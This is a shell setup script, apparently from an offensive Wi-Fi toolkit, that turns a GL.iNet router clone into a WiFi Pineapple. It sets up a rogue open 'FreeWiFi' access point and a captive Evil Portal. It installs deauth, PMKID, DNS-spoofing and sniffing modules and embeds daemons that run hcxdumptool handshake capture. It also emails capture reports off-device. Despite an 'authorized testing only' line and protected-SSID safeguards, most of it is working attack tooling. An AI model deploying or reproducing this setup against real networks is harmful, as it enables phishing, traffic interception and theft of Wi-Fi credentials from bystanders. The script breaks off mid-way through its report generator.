#!/bin/sh
# =============================================================================
#  Shadow-Apple-Installer  ·  setup.sh
#  Interactive, production-grade configurator for a freshly-flashed
#  WiFi Pineapple Cloner (GL.iNet AR300M-class "Shadow").
#
#  RUN ON THE DEVICE (needs a TTY for prompts):
#     cat setup.sh | ssh root@172.16.42.1 "cat > /tmp/setup.sh"
#     ssh -t root@172.16.42.1 "sh /tmp/setup.sh"
#  ...or paste into the panel's Terminal module.
#
#  It asks what you want, applies only what you choose, and never hard-codes
#  personal data. See the README for the full feature list.
#
#  ⚠ Offensive Wi-Fi tooling. Authorized testing only. See docs/LEGAL.md.
# =============================================================================
export LD_LIBRARY_PATH=/sd/usr/lib:/sd/lib:/usr/lib:/lib
TTY=/dev/tty; [ -r "$TTY" ] || TTY=/dev/stdin
COMMUNITY="https://raw.githubusercontent.com/xchwarze/wifi-pineapple-community/main"

c_b()  { printf '\033[1m%s\033[0m\n' "$*"; }
c_ok() { printf '  \033[32m✓\033[0m %s\n' "$*"; }
c_hr() { printf '\033[2m----------------------------------------------------------\033[0m\n'; }
die()  { printf '\033[31mERROR:\033[0m %s\n' "$*" >&2; exit 1; }
ask()  { _d="${2:-}"; if [ -n "$_d" ]; then printf '%s [%s]: ' "$1" "$_d" >&2; else printf '%s: ' "$1" >&2; fi
         IFS= read -r _a <"$TTY" || true; [ -z "$_a" ] && _a="$_d"; printf '%s' "$_a"; }
askpw(){ printf '%s: ' "$1" >&2; stty -echo <"$TTY" 2>/dev/null || true; IFS= read -r _a <"$TTY" || true
         stty echo <"$TTY" 2>/dev/null || true; printf '\n' >&2; printf '%s' "$_a"; }
yesno(){ _d="${2:-y}"; printf '%s [%s]: ' "$1" "$_d" >&2; IFS= read -r _a <"$TTY" || true; [ -z "$_a" ] && _a="$_d"
         case "$_a" in y|Y|yes|YES) return 0;; *) return 1;; esac; }
sedesc(){ printf '%s' "$1" | sed 's/\\/\\\\/g; s/[\/&]/\\&/g'; }   # safe for sed replacement

[ -d /pineapple ] || die "This must run on a flashed WiFi Pineapple Cloner (no /pineapple found). Flash first with flash.sh."

c_b "=================================================================="
c_b "   Shadow-Apple-Installer  —  interactive setup"
c_b "=================================================================="
echo "Answer the prompts (Enter = default). Nothing is applied until you confirm."
echo

# ---------------------------------------------------------------- PROMPTS ----
c_b "[1/8] Identity"
HOSTNAME=$(ask "Hostname" "SHADOW-APPLE")
ROOTPW=$(askpw "Root / panel password (blank = leave unchanged)")

c_b "[2/8] Internet uplink (Wi-Fi client mode)"
DO_UPLINK=y; yesno "Connect this device to a Wi-Fi network for internet?" "y" || DO_UPLINK=n
if [ "$DO_UPLINK" = y ]; then
  UPLINK_SSID=$(ask "  Upstream Wi-Fi SSID" "")
  UPLINK_PW=$(askpw "  Upstream Wi-Fi password")
fi

c_b "[3/8] Access points"
ROGUE_SSID=$(ask "Open/rogue AP name (the lure SSID clients see)" "FreeWiFi")
DO_MGMT=y; yesno "Broadcast a private management AP too?" "y" || DO_MGMT=n
if [ "$DO_MGMT" = y ]; then
  MGMT_SSID=$(ask "  Management AP name" "${HOSTNAME}-MGMT")
  MGMT_PW=$(askpw "  Management AP password (blank = root password)")
  [ -z "$MGMT_PW" ] && MGMT_PW="$ROOTPW"
  if [ ${#MGMT_PW} -lt 8 ]; then echo "  [!] Management AP password is <8 chars (WPA2 needs 8+). Skipping the management AP." >&2; DO_MGMT=n; fi
fi

c_b "[4/8] Modules"
echo "  curated = a strong ~30-module set · all = everything · none = skip · pick = choose"
MODSET=$(ask "Module set (curated/all/none/pick)" "curated")

c_b "[5/8] Evil Portal (captive guest page)"
DO_PORTAL=y; yesno "Install the branded captive portal?" "y" || DO_PORTAL=n
if [ "$DO_PORTAL" = y ]; then
  PORTAL_HEADLINE=$(ask "  Portal headline" "Welcome to $ROGUE_SSID")
  PORTAL_ACCENT=$(ask "  Accent colour (hex)" "#ff7a18")
fi

c_b "[6/8] Notifications (email reports)"
DO_MAIL=n; yesno "Send periodic recon/handshake reports by email?" "n" && DO_MAIL=y
if [ "$DO_MAIL" = y ]; then
  SMTP_HOST=$(ask "  SMTP host" "smtp.forwardemail.net")
  SMTP_PORT=$(ask "  SMTP port (465 SSL / 587 STARTTLS)" "465")
  SMTP_USER=$(ask "  SMTP username" "")
  SMTP_PASS=$(askpw "  SMTP password")
  SMTP_FROM=$(ask "  From address" "$SMTP_USER")
  REPORT_TO=$(ask "  Send reports to" "")
  REPORT_HRS=$(ask "  Report interval (hours)" "2")
fi

c_b "[7/8] Operating mode"
echo "  switch    = hardware slide switch: Left=recon, Right=deauth+capture (AR300M)"
echo "  auto      = time-based: alternate recon and passive capture automatically"
echo "  recon     = recon/discovery only"
echo "  none      = don't auto-run anything at boot"
MODE=$(ask "Boot mode (switch/auto/recon/none)" "switch")

DO_PROTECT=n
if [ "$MODE" = switch ] || [ "$MODE" = auto ]; then
  c_b "[8/8] Protected networks (never deauthed)"
  echo "  Enter your OWN SSIDs, comma-separated. Trailing * = prefix (e.g. Home* )."
  PROTECT_RAW=$(ask "  Protected SSIDs" "")
  [ -n "$PROTECT_RAW" ] && DO_PROTECT=y
fi

# ---------------------------------------------------------------- CONFIRM ----
echo; c_hr; c_b "Summary"
echo "  Hostname        : $HOSTNAME"
echo "  Uplink          : $([ "$DO_UPLINK" = y ] && echo "$UPLINK_SSID" || echo "(none)")"
echo "  Rogue/open AP   : $ROGUE_SSID"
echo "  Management AP   : $([ "$DO_MGMT" = y ] && echo "$MGMT_SSID" || echo "(none)")"
echo "  Modules         : $MODSET"
echo "  Evil Portal     : $([ "$DO_PORTAL" = y ] && echo "yes ($PORTAL_HEADLINE)" || echo "no")"
echo "  Email reports   : $([ "$DO_MAIL" = y ] && echo "every ${REPORT_HRS}h -> $REPORT_TO" || echo "no")"
echo "  Boot mode       : $MODE"
echo "  Protected SSIDs : $([ "$DO_PROTECT" = y ] && echo "$PROTECT_RAW" || echo "(none)")"
c_hr
yesno "Apply this configuration?" "y" || die "Aborted — nothing changed."
echo

# ---------------------------------------------------------------- APPLY ------
mkdir -p /sd/bot /sd/handshakes /sd/reports /tmp/handshakes

c_b "Applying…"
# clear the panel first-run wizard (it re-sets password AND resets wireless if it runs)
rm -f /etc/pineapple/setupRequired 2>/dev/null

# hostname + password
uci set system.@system[0].hostname="$HOSTNAME"; uci commit system; echo "$HOSTNAME" > /proc/sys/kernel/hostname
[ -n "$ROOTPW" ] && printf '%s\n%s\n' "$ROOTPW" "$ROOTPW" | passwd root >/dev/null 2>&1
c_ok "hostname=$HOSTNAME, password set"

# ---- radio detection: onboard=uplink+mgmt, dual-band USB=monitor, 2.4 USB=source AP
phy_for_path(){ for d in /sys/class/ieee80211/*; do dp=$(readlink -f "$d/device" 2>/dev/null)
  case "$dp" in *"$1"*) basename "$d"; return;; esac; done; }
is_dualband(){ iw phy "$1" info 2>/dev/null | grep -qE ' 5[0-9]{3}(\.[0-9])? MHz'; }
USB24=""; USBDB=""; ONBOARD=""; i=0
while uci -q get wireless.radio$i >/dev/null 2>&1; do
  p=$(uci -q get wireless.radio$i.path 2>/dev/null)
  case "$p" in
    *usb*) phy=$(phy_for_path "$p"); if is_dualband "$phy"; then USBDB=$i; else USB24=$i; fi ;;
    "") : ;; *) ONBOARD=$i ;;
  esac; i=$((i+1))
done
c_ok "radios: onboard=radio${ONBOARD:-?} dual-band-USB=radio${USBDB:-?} 2.4-USB=radio${USB24:-?}"

# put PineAP source (AP) on the 2.4 USB card, monitor on the dual-band card (path swap)
SRC=$(uci -q get pineap.@config[0].pineap_source_interface)
MON=$(uci -q get pineap.@config[0].pineap_interface)
if [ "$SRC" = "wlan0" ] && [ "$MON" = "wlan1mon" ] && [ -n "$USB24" ] && [ -n "$USBDB" ]; then
  P0=$(uci get wireless.radio$USB24.path); P1=$(uci get wireless.radio$USBDB.path)
  uci set wireless.radio0.path="$P0"; uci set wireless.radio1.path="$P1"
  uci set wireless.radio1.hwmode='11a'
  c_ok "monitor=dual-band card, source AP=2.4 card"
fi

# rogue/open AP name on the source card
uci set wireless.@wifi-iface[0].ssid="$ROGUE_SSID"; uci set wireless.@wifi-iface[0].encryption='none'

# onboard radio: uplink STA + management AP + channel
if [ -n "$ONBOARD" ] && [ "$DO_UPLINK" = y ]; then
  UPCH=""
  for sc in wlan${USBDB} wlan${USB24} wlan${ONBOARD}; do
    ifconfig "$sc" up 2>/dev/null
    UPCH=$(iwinfo "$sc" scan 2>/dev/null | awk -v s="\"$UPLINK_SSID\"" '$0 ~ "ESSID: "s{f=1} f&&/Channel:/{sub(/.*Channel: /,"");print $1;exit}')
    [ -n "$UPCH" ] && break
  done
  [ -z "$UPCH" ] && UPCH=$(ask "  Couldn't auto-detect '$UPLINK_SSID' channel; enter it" "6")
  # neutralize onboard placeholder ifaces, add STA + (optional) mgmt AP
  idx=0; while uci -q get wireless.@wifi-iface[$idx] >/dev/null 2>&1; do
    [ "$(uci -q get wireless.@wifi-iface[$idx].device)" = "radio$ONBOARD" ] && uci set wireless.@wifi-iface[$idx].disabled='1'
    idx=$((idx+1)); done
  S=$(uci add wireless wifi-iface)
  uci set wireless.$S.device="radio$ONBOARD"; uci set wireless.$S.mode='sta'; uci set wireless.$S.ifname="wlan${ONBOARD}"
  uci set wireless.$S.network='wwan'; uci set wireless.$S.ssid="$UPLINK_SSID"; uci set wireless.$S.encryption='psk2'; uci set wireless.$S.key="$UPLINK_PW"
  if [ "$DO_MGMT" = y ]; then
    A=$(uci add wireless wifi-iface)
    uci set wireless.$A.device="radio$ONBOARD"; uci set wireless.$A.mode='ap'; uci set wireless.$A.ifname="wlan${ONBOARD}-1"
    uci set wireless.$A.network='lan'; uci set wireless.$A.ssid="$MGMT_SSID"; uci set wireless.$A.encryption='psk2'; uci set wireless.$A.key="$MGMT_PW"
  fi
  uci set wireless.radio$ONBOARD.channel="$UPCH"
  c_ok "uplink '$UPLINK_SSID' (ch $UPCH)$([ "$DO_MGMT" = y ] && echo " + mgmt AP '$MGMT_SSID'")"
fi
uci commit wireless

# repeater: lan -> wwan forwarding
if [ "$DO_UPLINK" = y ]; then
  have=0; i=0; while uci -q get firewall.@forwarding[$i] >/dev/null 2>&1; do
    [ "$(uci -q get firewall.@forwarding[$i].src)" = lan ] && [ "$(uci -q get firewall.@forwarding[$i].dest)" = wwan ] && have=1; i=$((i+1)); done
  [ $have = 0 ] && { uci add firewall forwarding >/dev/null; uci set firewall.@forwarding[-1].src='lan'; uci set firewall.@forwarding[-1].dest='wwan'; uci commit firewall; }
  c_ok "repeater forwarding lan->wwan"
fi

c_b "Applying Wi-Fi…"; wifi reload >/dev/null 2>&1; sleep 10
[ "$DO_UPLINK" = y ] && { ifup wwan >/dev/null 2>&1; /etc/init.d/firewall reload >/dev/null 2>&1; sleep 6; }

# wait for internet
NET=0
if [ "$DO_UPLINK" = y ]; then
  printf "  waiting for internet"; n=0; while [ $n -lt 12 ]; do ping -q -c1 -W2 1.1.1.1 >/dev/null 2>&1 && { NET=1; break; }; printf "."; sleep 3; n=$((n+1)); done; echo
  [ $NET = 1 ] && c_ok "internet up" || echo "  [!] no internet yet — package/module steps may be skipped."
fi

# USB /sd + missing packages
if ! mount | grep -q ' /sd '; then
  echo "  A USB drive will be FORMATTED for /sd — ALL data on it will be erased."
  if yesno "  Format the attached USB now?" "y"; then c_b "Formatting USB -> /sd"; ( cd / && wpc-tools format_sd ) >/dev/null 2>&1; fi
fi
mount | grep -q ' /sd ' && c_ok "/sd mounted"
uci set pineap.@config[0].recon_db_path='/sd/recon.db'; uci commit pineap
[ $NET = 1 ] && { c_b "Installing missing packages (python/php)…"; ( cd / && wpc-tools missing_packages ) >/dev/null 2>&1; c_ok "missing packages"; }

# modules
if [ "$MODSET" != none ] && [ $NET = 1 ]; then
  c_b "Installing modules…"
  JSON=$(uclient-fetch -q -O- "$COMMUNITY/modules/build/modules.json" 2>/dev/null)
  CURATED="Cabinet ConnectedClients DWall EvilPortal PortalAuth Responder SignalStrength SSIDManager MACInfo Locate LEDController Status OnlineHashCrack RandomRoll HTTPProxy get InternetSpeedTest Papers LogManager Deauth Occupineapple SiteSurvey PMKIDAttack Terminal nmap tcpdump ngrep p0f DNSspoof urlsnarf wps"
  ALLM=$(printf '%s' "$JSON" | grep -o '"[A-Za-z0-9_]*":{' | sed 's/[":{]//g')
  case "$MODSET" in
    all) LIST="$ALLM" ;;
    pick) LIST=""; for m in $ALLM; do yesno "  install $m?" "n" && LIST="$LIST $m"; done ;;
    *) LIST="$CURATED" ;;
  esac
  mkdir -p /sd/tmp /sd/modules; OKM=0
  for N in $LIST; do
    [ -e "/sd/modules/$N" ] && continue
    CK=$(printf '%s' "$JSON" | grep -o "\"$N\":{[^}]*}" | grep -o '"checksum":"[0-9a-f]\{64\}"' | sed 's/.*"checksum":"//;s/"//')
    uclient-fetch -q -T 30 -O "/sd/tmp/$N.tar.gz" "$COMMUNITY/modules/build/$N.tar.gz" 2>/dev/null
    GOT=$(sha256sum "/sd/tmp/$N.tar.gz" 2>/dev/null | awk '{print $1}')
    if [ -n "$CK" ] && [ "$GOT" = "$CK" ] && tar -xzf "/sd/tmp/$N.tar.gz" -C /sd/modules/ 2>/dev/null; then
      ln -sf "/sd/modules/$N" "/pineapple/modules/$N"; OKM=$((OKM+1)); fi
    rm -f "/sd/tmp/$N.tar.gz"
  done
  c_ok "$OKM modules installed"
  c_b "Installing module dependencies…"
  for P in mdk3 hcxdumptool ttyd nmap tcpdump ngrep p0f dnsspoof urlsnarf reaver bully pixiewps libpcap; do
    opkg --dest sd install "$P" >/dev/null 2>&1; done
  c_ok "dependencies installed"
fi

# ---- embed device scripts ---------------------------------------------------
cat > /sd/bot/switch-mode.sh <<'SAI_switch_mode_sh_EOF'
#!/bin/sh
# Shadow-Apple hardware-switch mode daemon.
#   Switch FULL-LEFT  = RECON only              green LED
#   Switch RIGHT      = DEAUTH + HANDSHAKE CAPTURE (whitelist)  red LED
# Detection uses the LEFT gpio only (the RIGHT gpio never asserts on this unit).
#
# HARDWARE NOTE (AR300M + rt2800usb / RT5572): the USB Wi-Fi driver wedges if a
# monitor vif is created or active injection starts while the radio is busy or
# the system hasn't settled. A wedge trips the 30s watchdog -> reboot. To make
# that impossible to turn into a loop, and to keep boot always-stable:
#
#   1) DEAUTH NEVER AUTO-ARMS ON BOOT. Every boot comes up in RECON (green),
#      even if the switch is physically RIGHT. To enter deauth you must move the
#      switch to LEFT (recon, "safe") and then back to RIGHT -- an explicit arm.
#      => a deauth wedge -> reboot always lands back in recon. No loop, ever.
#   2) boot-settle grace: nothing fragile runs until the system is up ~90s.
#   3) failsafe flag .deauth_pending: set before hcx, cleared only after 75s of
#      stable capture; if it survives a reboot it's logged as "prior wedge".
#   4) deauth uses gentler settings (no client-attack flood) + a time-guarded
#      monitor bring-up (airmon can't hang the daemon forever).
export LD_LIBRARY_PATH=/sd/usr/lib:/sd/lib:/usr/lib:/lib
LOG=/sd/bot/switch.log
HCXFILTER=/sd/bot/hcx-protect.list
OUT=/sd/handshakes
PIDF=/tmp/bot-mode.pid
PENDING=/sd/bot/.deauth_pending
SETTLE=90
RLED=/sys/class/leds/gl-ar300m:red:wlan/brightness
GLED=/sys/class/leds/gl-ar300m:green:system/brightness
led(){ for t in /sys/class/leds/gl-ar300m:*/trigger; do echo none > "$t" 2>/dev/null; done
  case "$1" in
    recon)  echo 0   > $RLED 2>/dev/null; echo 255 > $GLED 2>/dev/null;;
    deauth) echo 255 > $RLED 2>/dev/null; echo 0   > $GLED 2>/dev/null;;
  esac; }
blink_arm(){ i=0; while [ $i -lt 4 ]; do echo 255>$RLED 2>/dev/null;echo 0>$GLED 2>/dev/null;sleep 1
    echo 0>$RLED 2>/dev/null;echo 255>$GLED 2>/dev/null;sleep 1;i=$((i+1)); done; }
gval(){ grep "button $1" /sys/kernel/debug/gpio 2>/dev/null | grep -oE ' (lo|hi)' | tr -d ' ' | head -1; }
read_pos(){ [ "$(gval left)" = "hi" ] && echo LEFT || echo RIGHT; }
have(){ command -v "$1" >/dev/null 2>&1; }
tmo(){ if have timeout; then timeout "$@"; else shift; "$@"; fi; }   # busybox timeout guard
stop_all(){
  [ -f $PIDF ] && kill "$(cat $PIDF)" 2>/dev/null; rm -f $PIDF
  pkill hcxdumptool 2>/dev/null; killall mdk3 2>/dev/null
  pineap /tmp/pineap.conf stop_scan >/dev/null 2>&1
  pineap /tmp/pineap.conf unpause   >/dev/null 2>&1
  sleep 4; }
start_recon(){ led recon
  ( while true; do
      pineap /tmp/pineap.conf run_scan 60 2 >/dev/null 2>&1
      W=0; while [ $W -lt 75 ]; do pineap /tmp/pineap.conf get_status 2>/dev/null | grep scanRunning | grep -q true || break; sleep 5; W=$((W+5)); done
    done ) & echo $! > $PIDF; }
start_deauth(){
  /sd/bot/wl-refresh.sh >/dev/null 2>&1
  # SAFETY: protected SSIDs configured but filter empty -> don't attack our own nets.
  if [ -s /sd/bot/protect-ssids.conf ] && [ ! -s "$HCXFILTER" ]; then
    echo "$(date) REFUSING deauth: protected SSIDs configured but filter empty -> recon" >> $LOG
    start_recon; return
  fi
  led deauth
  # free the radio fully before touching the monitor vif (prevents driver wedge).
  pineap /tmp/pineap.conf stop_scan >/dev/null 2>&1
  pineap /tmp/pineap.conf pause     >/dev/null 2>&1
  sleep 4
  # bring up a monitor vif, reusing an existing one; airmon is time-guarded so a
  # hang can't freeze the daemon. Prefer iw create if airmon didn't make one.
  if ! iw dev 2>/dev/null | grep -q wlan1mon; then
    tmo 25 airmon-ng start wlan1 >/dev/null 2>&1
    iw dev 2>/dev/null | grep -q wlan1mon || iw dev wlan1 interface add wlan1mon type monitor >/dev/null 2>&1
    sleep 2
  fi
  MON=wlan1mon; iw dev 2>/dev/null | grep -q wlan1mon || MON=wlan1
  ip link set "$MON" up 2>/dev/null
  if ! iw dev "$MON" info 2>/dev/null | grep -q monitor; then
    echo "$(date) deauth abort: no monitor iface -> recon" >> $LOG; start_recon; return
  fi
  touch "$PENDING"                       # failsafe: cleared only after 75s stable
  FILT=""; [ -s "$HCXFILTER" ] && FILT="--filterlist_ap=$HCXFILTER --filtermode=1"
  TS=$(date +%Y%m%d_%H%M%S)
  # RT5572 SAFETY: active injection floods the rt2800usb TX path and wedges the
  # driver -> watchdog reboot -> a wedged card even HANGS boot. Default is a fully
  # PASSIVE dumper (--disable_client_attacks --disable_ap_attacks = no injection at
  # all), which never wedges; it captures handshakes/PMKID opportunistically.
  # Opt into active AP attacks (stronger, may wedge -> power-cycle to recover) with:
  #     touch /sd/bot/deauth-active
  ATK="--disable_client_attacks --disable_ap_attacks"; MODEWORD="PASSIVE capture"
  [ -f /sd/bot/deauth-active ] && { ATK="--disable_client_attacks"; MODEWORD="ACTIVE deauth (AP)"; }
  echo "$(date) hcx $MODEWORD on $MON (protect $([ -s "$HCXFILTER" ] && wc -l < "$HCXFILTER" || echo 0) BSSIDs)" >> $LOG
  /sd/usr/sbin/hcxdumptool -i "$MON" -o "$OUT/capture_$TS.pcapng" $FILT \
      $ATK --enable_status=3 >> "$OUT/hcx-status.log" 2>&1 &
  HP=$!; echo $HP > $PIDF
  # if hcx dies within 8s it rejected an option / the driver wedged: fall back.
  ( sleep 8; kill -0 "$HP" 2>/dev/null || { echo "$(date) hcx exited early -> recon" >> $LOG; led recon; }
    sleep 67; kill -0 "$HP" 2>/dev/null && rm -f "$PENDING" ) &   # 75s total stable -> clear failsafe
}
mount | grep -q '/sys/kernel/debug' || mount -t debugfs none /sys/kernel/debug 2>/dev/null
echo "$(date) switch-mode daemon start" >> $LOG
# ---- boot policy: ALWAYS start in recon; deauth must be armed by LEFT->RIGHT ----
FORCE_RECON=1
if [ -f "$PENDING" ]; then
  rm -f "$PENDING"
  echo "$(date) boot: prior deauth did not stabilize (wedge). recon held; arm again with LEFT->RIGHT" >> $LOG
else
  echo "$(date) boot: recon by default. move switch LEFT then RIGHT to arm deauth" >> $LOG
fi
led recon
# boot-settle grace (skipped once already up SETTLE seconds)
UP=$(cut -d. -f1 /proc/uptime 2>/dev/null); UP=${UP:-999}; G=$((SETTLE-UP)); [ "$G" -gt 0 ] && sleep "$G"
# if held (switch is RIGHT at boot) flash the arm hint once, then solid green recon
[ "$(read_pos)" = "RIGHT" ] && blink_arm
led recon
CUR=""; PEND=""; STABLE=0
while true; do
  P=$(read_pos)
  if [ "$FORCE_RECON" = 1 ]; then
    if [ "$P" = "LEFT" ]; then FORCE_RECON=0; else P=LEFT; fi   # arm cleared by visiting LEFT
  fi
  if [ "$P" = "$PEND" ]; then STABLE=$((STABLE+1)); else PEND="$P"; STABLE=1; fi
  if [ "$STABLE" -ge 2 ] && [ "$P" != "$CUR" ]; then
    echo "$(date) -> $P (left=$(gval left))" >> $LOG
    stop_all
    case "$P" in LEFT) start_recon;; RIGHT) start_deauth;; esac
    CUR="$P"
  fi
  sleep 3
done
SAI_switch_mode_sh_EOF
chmod +x /sd/bot/switch-mode.sh 2>/dev/null
cat > /sd/bot/wl-refresh.py <<'SAI_wl_refresh_py_EOF'
#!/sd/usr/bin/python
# -*- coding: utf-8 -*-
# Build PROTECTED-BSSID lists from configured SSID patterns.
#   Reads:  /sd/bot/protect-ssids.conf  (one SSID per line; trailing '*' = prefix match; '#' comments)
#   Sources: recon.db (pineap scans) + hcx capture log + our own live AP BSSIDs
#   Writes: whitelist.lst (mdk3, AA:BB..) and hcx-protect.list (hcxdumptool, aabb.. lowercase)
import sqlite3, re, subprocess, os
CONF='/sd/bot/protect-ssids.conf'
WL='/pineapple/modules/Deauth/lists/whitelist.lst'
HL='/sd/bot/hcx-protect.list'
DB='/sd/recon.db'
LOG='/sd/handshakes/hcx-status.log'
OUR_IFACES=['wlan0','wlan2-1']

def norm(m):
    m=(m or '').replace(':','').replace('-','').lower()
    return m if re.match(r'^[0-9a-f]{12}$', m) else None

pats=[]
try:
    for line in open(CONF):
        s=line.split('#')[0].strip()
        if s: pats.append(s)
except Exception:
    pass

def match(ssid):
    for p in pats:
        if p.endswith('*'):
            if ssid.startswith(p[:-1]): return p
        elif ssid==p:
            return p
    return None

res={}
for p in pats: res[p]=set()

try:
    c=sqlite3.connect(DB)
    for ssid,bssid in c.execute("select ssid,bssid from aps"):
        p=match(ssid or '')
        if p:
            n=norm(bssid)
            if n: res[p].add(n)
except Exception:
    pass

try:
    rx=re.compile(r'<-[->] ([0-9a-f]{12}) .*\(([^)]*)\)\s*$')
    for line in open(LOG):
        m=rx.search(line)
        if m:
            p=match(m.group(2))
            if p:
                n=norm(m.group(1))
                if n: res[p].add(n)
except Exception:
    pass

# Build the full protected-BSSID set FIRST, independent of any file write, so a
# failure writing the (optional) mdk3 list can never leave the hcx filter empty.
allm=set()
for p in pats:
    for n in res[p]: allm.add(n)
# always protect our own APs
for ifc in OUR_IFACES:
    try:
        out=subprocess.Popen(['iwinfo',ifc,'info'],stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()[0]
        mm=re.search(r'Access Point:\s*([0-9A-Fa-f:]{17})', out)
        n=norm(mm.group(1)) if mm else None
        if n: allm.add(n)
    except Exception:
        pass

# hcxdumptool filter (critical for deauth safety) — /sd/bot always exists; write it FIRST.
try: os.makedirs('/sd/bot')
except OSError: pass
h=open(HL,'w')
for n in sorted(allm): h.write(n+"\n")
h.close()

# mdk3 whitelist (best-effort; its directory only exists if the Deauth module is installed).
try:
    try: os.makedirs(os.path.dirname(WL))
    except OSError: pass
    w=open(WL,'w')
    w.write("# ==== PROTECTED networks (never deauthed). mdk3 whitelist / hcx filtermode=1 ====\n")
    w.write("# Auto-generated by wl-refresh.py from protect-ssids.conf + recon.db + capture log + our APs.\n\n")
    for p in pats:
        w.write("# %s\n" % p)
        for n in sorted(res[p]):
            w.write(':'.join(n[i:i+2] for i in range(0,12,2)).upper()+"\n")
    w.close()
except Exception:
    pass
print "protected: %d BSSIDs from %d SSID patterns" % (len(allm), len(pats))
SAI_wl_refresh_py_EOF
chmod +x /sd/bot/wl-refresh.py 2>/dev/null
cat > /sd/bot/wl-refresh.sh <<'SAI_wl_refresh_sh_EOF'
#!/bin/sh
export LD_LIBRARY_PATH=/sd/usr/lib:/sd/lib:/usr/lib:/lib
export PYTHONHOME=/sd/usr
/sd/usr/bin/python /sd/bot/wl-refresh.py
SAI_wl_refresh_sh_EOF
chmod +x /sd/bot/wl-refresh.sh 2>/dev/null
cat > /sd/bot/recon-capture-loop.sh <<'SAI_recon_capture_loop_sh_EOF'
#!/bin/sh
# Alternating recon <-> passive handshake capture. STRICTLY one consumer of the
# monitor at a time, with waits for async scan completion + settle delays between
# phases (the churn of rapid start/stop is what wedged the device; long phases + clean
# handoffs avoid it). Args: $1 = recon seconds (default 300), $2 = capture seconds (default 900).
export LD_LIBRARY_PATH=/sd/usr/lib:/sd/lib:/usr/lib:/lib
HCX=/sd/usr/sbin/hcxdumptool
OUT=/sd/handshakes; STATUS="$OUT/hcx-status.log"; LOG=/sd/bot/altloop.log
mkdir -p "$OUT"
SCAN=${1:-300}; CAP=${2:-900}
lg(){ echo "$(date '+%m-%d %H:%M:%S') $*" >> "$LOG"; }
lg "=== altloop start (scan=${SCAN}s cap=${CAP}s) ==="
while true; do
  # ===== RECON phase (async run_scan, then wait for it to finish) =====
  lg "recon: run_scan ${SCAN}s"
  pineap /tmp/pineap.conf run_scan "$SCAN" 2 >/dev/null 2>&1
  W=0; LIM=$((SCAN+40))
  while [ "$W" -lt "$LIM" ]; do
    pineap /tmp/pineap.conf get_status 2>/dev/null | grep scanRunning | grep -q true || break
    sleep 5; W=$((W+5))
  done
  lg "recon: done (waited ${W}s)"
  # ===== transition -> capture: free the monitor, settle =====
  pineap /tmp/pineap.conf stop_scan >/dev/null 2>&1
  pineap /tmp/pineap.conf pause    >/dev/null 2>&1
  sleep 6
  # ===== CAPTURE phase: ONE long hcxdumptool window (no churn) =====
  TS=$(date +%Y%m%d_%H%M%S)
  lg "capture: hcx ${CAP}s -> cap_$TS.pcapng"
  "$HCX" -i wlan1mon -o "$OUT/cap_$TS.pcapng" -t 5 --disable_client_attacks --enable_status=3 >>"$STATUS" 2>&1 &
  HP=$!
  W=0
  while [ "$W" -lt "$CAP" ] && kill -0 "$HP" 2>/dev/null; do sleep 10; W=$((W+10)); done
  kill "$HP" 2>/dev/null; sleep 3; kill -9 "$HP" 2>/dev/null; sleep 6
  lg "capture: done"
  # ===== transition -> recon: resume hop, settle =====
  pineap /tmp/pineap.conf unpause >/dev/null 2>&1
  sleep 4
  # housekeeping
  [ -f "$OUT/cap_$TS.pcapng" ] && [ "$(wc -c < "$OUT/cap_$TS.pcapng")" -lt 2000 ] && rm -f "$OUT/cap_$TS.pcapng"
  ls -t "$OUT"/cap_*.pcapng 2>/dev/null | tail -n +400 | xargs rm -f 2>/dev/null
  tail -c 300000 "$STATUS" > "$STATUS.t" 2>/dev/null && mv "$STATUS.t" "$STATUS"
done
SAI_recon_capture_loop_sh_EOF
chmod +x /sd/bot/recon-capture-loop.sh 2>/dev/null
cat > /sd/bot/recondump.py <<'SAI_recondump_py_EOF'
#!/sd/usr/bin/python
# Schema-agnostic recon.db summary (row counts per table). Used by bot-report.
import sqlite3, sys
db = sys.argv[1] if len(sys.argv) > 1 else '/sd/recon.db'
try:
    c = sqlite3.connect(db)
    tables = [r[0] for r in c.execute("select name from sqlite_master where type='table'")]
    if not tables:
        print ' (empty database)'
    for t in tables:
        try:
            n = c.execute('select count(*) from "%s"' % t).fetchone()[0]
        except Exception:
            n = '?'
        print ' %-22s %s rows' % (t, n)
except Exception as e:
    print ' db read error:', e
SAI_recondump_py_EOF
chmod +x /sd/bot/recondump.py 2>/dev/null

# ---- email (msmtp) ----------------------------------------------------------
if [ "$DO_MAIL" = y ] && [ -n "$SMTP_USER" ]; then
  c_b "Configuring email…"; [ $NET = 1 ] && opkg --dest sd install msmtp ca-bundle >/dev/null 2>&1
  TLSST=off; [ "$SMTP_PORT" = 587 ] && TLSST=on; mkdir -p /sd/etc
  cat > /sd/etc/msmtprc <<MSMTP
defaults
auth on
tls on
tls_starttls $TLSST
tls_trust_file /etc/ssl/certs/ca-certificates.crt
logfile /sd/msmtp.log

account fe
host $SMTP_HOST
port $SMTP_PORT
from $SMTP_FROM
user $SMTP_USER
password $SMTP_PASS

account default : fe
MSMTP
  chmod 600 /sd/etc/msmtprc
  cat > /usr/bin/bot-mail <<MAIL
#!/bin/sh
SUBJ="\${1:-$HOSTNAME}"; TO="\${2:-$REPORT_TO}"
export LD_LIBRARY_PATH=/sd/usr/lib:/sd/lib:/usr/lib:/lib
{ printf 'From: $HOSTNAME <$SMTP_FROM>\nTo: %s\nSubject: %s\n\n' "\$TO" "\$SUBJ"; cat; } | /sd/usr/bin/msmtp -C /sd/etc/msmtprc -a fe "\$TO"
MAIL
  chmod +x /usr/bin/bot-mail
  c_ok "email via $SMTP_HOST -> $REPORT_TO"
fi

# ---- report generator -------------------------------------------------------
cat > /usr/bin/bot-report <<'RPT'
#!/bin/sh
export LD_LIBRARY_PATH=/sd/usr/lib:/sd/lib:/usr/lib:/lib
export PYTHONHOME=/sd/usr
DB=/sd/recon.db; HSD=/sd/handshakes; STATUS=/sd/handshakes/hcx-status.log
TO="${1:-}"; TS=$(date '+%Y-%m-%d %H:%M %Z'); mkdir -p /sd/reports
RPTF="/sd/reports/report_$(date +%Y%m%d_%H%M%S).txt"
PC=$(ls -1 $HSD/*.pcapng 2>/dev/null | wc -l)
HS=$(grep -oE 'MP:M[0-9]M[0-9].*\(.*\)$' "$STATUS" 2>/dev/null | sed -E 's/.*\((.*)\)$/\1/' | sort -u | grep -v '^$')
HN=$(printf '%s\n' "$HS" | grep -c .)
PM=$(grep -ci 'PMKID' "$STATUS" 2>/dev/null)
